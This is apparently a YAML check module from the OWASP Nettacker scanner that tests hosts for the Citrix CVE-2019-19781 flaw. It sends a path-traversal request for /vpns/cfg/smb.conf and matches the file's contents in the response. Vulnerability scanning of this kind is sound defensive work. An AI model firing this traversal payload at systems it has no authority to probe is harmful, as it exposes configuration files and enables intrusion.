info:
  name: citrix_cve_2019_19781_vuln
  author: OWASP Nettacker Team
  severity: 8
  description:
  reference:
  profiles:
    - vuln
    - vulnerability
    - http
    - high_severity
    - citrix_cve_2019_19781

payloads:
  - library: http
    verify: false
    timeout: 10
    cert: ""
    stream: false
    proxies: ""
    steps:
      - method: get
        headers:
          User-Agent: "{user_agent}"
        url:
          nettacker_fuzzer:
            input_format: "{{schema}}://{target}:{{ports}}/vpn/../vpns/cfg/smb.conf"
            prefix: ""
            suffix: ""
            interceptors:
            data:
              schema:
                - "http"
                - "https"
              ports:
                - 80
                - 443
        response:
          condition_type: and
          conditions:
            status_code:
              regex: "200"
              reverse: false
            content:
              regex: "\\[global\\]|lmhosts"
              reverse: false